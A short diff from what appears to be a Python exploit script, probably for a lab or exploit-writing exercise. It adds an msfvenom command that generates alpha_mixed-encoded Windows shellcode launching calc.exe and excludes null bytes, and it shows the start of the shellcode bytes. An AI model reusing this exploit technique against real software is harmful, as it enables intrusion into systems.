@@ -10,6 +10,7 @@ from struct import pack
 #   4. Add NOPSLED and shellcode with alpha_mixed to not deal with badchars
 #   5. Pop calc
 
+# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode_calc -e x86/alpha_mixed -b "\x00"
 shellcode_calc =  ""
 shellcode_calc += "\x89\xe7\xda\xc4\xd9\x77\xf4\x5e\x56\x59"
 shellcode_calc += "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
